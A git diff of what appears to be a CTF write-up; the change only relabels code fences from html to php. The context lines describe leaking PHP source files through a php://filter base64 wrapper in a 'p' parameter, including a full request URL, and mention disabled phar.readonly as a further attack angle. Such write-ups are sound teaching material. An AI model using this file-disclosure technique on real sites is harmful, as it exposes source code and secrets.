@@ -49,7 +49,7 @@ You can leak the source code using a php wrapper to p parameter.
 
 `http://web2.tendollar.kr:8100/?p=php://filter/convert.base64-encode/resource=index`
 
-```html
+```php
 <!-- index.php -->
 <?php
     error_reporting(0);
@@ -71,7 +71,7 @@ You can leak the source code using a php wrapper to p parameter.
 
 Leaks config.php and lib.php source code.
 
-```html
+```php
 <!-- config.php -->
 <?php
 //	error_reporting(0);
@@ -115,7 +115,7 @@ The important code is `ini_set ('phar.readonly', 0);` with the phar.readonly opt
 
 Leaks nyaa.php and nyaaa.php source code.
 
-```html
+```php
 <!-- nyaa.php -->
 <?php
     if($_SESSION['is_login'] !==1 ) die("<script>alert('Login please.');history.back();</script>");
@@ -157,7 +157,7 @@ However, since the input value "url" is **filtered**, it can not be requested ex
 
 Leaks profile.php and uploadThumb.php source code.
 
-```html
+```php
 <!-- profile.php -->
 <?php
     if($_SESSION['is_login'] !==1 ) die("<script>alert('Login please.');history.back();</script>");
